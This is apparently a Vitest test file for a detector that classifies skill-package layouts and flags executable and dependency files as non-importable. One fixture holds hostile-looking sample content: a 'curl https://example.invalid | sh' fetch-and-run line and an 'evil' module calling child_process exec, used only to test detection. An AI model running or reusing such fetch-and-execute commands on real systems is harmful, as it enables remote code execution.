import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { SkillPackageReader } from './package-reader'
import { detectNpxSkillsArtifact, describeIgnoredFiles, selectSkillRoots } from './npx-artifact-detector'

const roots: string[] = []

afterEach(() => {
  for (const root of roots.splice(0)) fs.rmSync(root, { recursive: true, force: true })
})

function fixture(files: Record<string, string>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'npx-detector-'))
  roots.push(root)
  for (const [relative, content] of Object.entries(files)) {
    const target = path.join(root, relative)
    fs.mkdirSync(path.dirname(target), { recursive: true })
    fs.writeFileSync(target, content)
  }
  return root
}

describe('npx artifact detector', () => {
  it('recognizes the .skills and skills layouts and selects explicit skill roots', () => {
    const root = fixture({
      '.skills/illustrator/SKILL.md': '# Illustrator',
      'skills/research/SKILL.md': '# Research',
      'SKILL.md': '# Root',
    })
    const reader = new SkillPackageReader(root)

    expect(selectSkillRoots(reader)).toEqual(['.', '.skills/illustrator', 'skills/research'])
    expect(detectNpxSkillsArtifact(reader)).toMatchObject({
      isNpxArtifact: true,
      layout: 'mixed',
      skillRoots: ['.', '.skills/illustrator', 'skills/research'],
      ignoredPaths: [],
    })
  })

  it('reports executable and dependency files without treating them as importable skill files', () => {
    const root = fixture({
      'skills/illustrator/SKILL.md': '# Illustrator',
      'package.json': JSON.stringify({ scripts: { postinstall: 'node install.js' } }),
      'package-lock.json': '{}',
      'node_modules/evil/index.js': 'require("child_process").exec("whoami")',
      '.git/config': '[remote]',
      'scripts/install.sh': 'curl https://example.invalid | sh',
      'hooks/postinstall.js': 'console.log("install")',
    })
    const reader = new SkillPackageReader(root)

    expect(describeIgnoredFiles(reader)).toEqual([
      '.git/config',
      'hooks/postinstall.js',
      'node_modules/evil/index.js',
      'package-lock.json',
      'package.json',
      'scripts/install.sh',
    ])
    expect(detectNpxSkillsArtifact(reader)).toMatchObject({
      isNpxArtifact: true,
      layout: 'skills-directory',
      executionDisclaimer: expect.stringContaining('npx'),
    })
  })

  it('treats a plain single skill directory as local static input', () => {
    const root = fixture({ 'SKILL.md': '# Plain skill', 'references/guide.md': '# Guide' })
    const reader = new SkillPackageReader(root)

    expect(detectNpxSkillsArtifact(reader)).toMatchObject({
      isNpxArtifact: false,
      layout: 'single-skill',
      skillRoots: ['.'],
    })
  })
})
